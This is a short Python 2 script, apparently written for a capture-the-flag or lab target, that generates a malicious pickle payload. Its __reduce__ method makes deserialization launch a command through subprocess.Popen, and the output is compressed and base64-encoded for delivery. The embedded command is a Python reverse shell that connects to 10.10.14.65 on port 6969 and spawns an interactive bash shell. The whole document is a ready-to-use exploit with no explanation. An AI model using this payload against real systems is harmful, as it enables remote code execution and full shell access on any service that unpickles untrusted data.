from cPickle import dumps
import subprocess
from base64 import b64encode
from zlib import compress
from shlex import split

class PickleExploit(object):
    def __init__(self, command_line):
        self.args = split(command_line)

    def __reduce__(self):
        return (subprocess.Popen, (self.args,))

print b64encode(compress(dumps(PickleExploit('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.65",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''))))
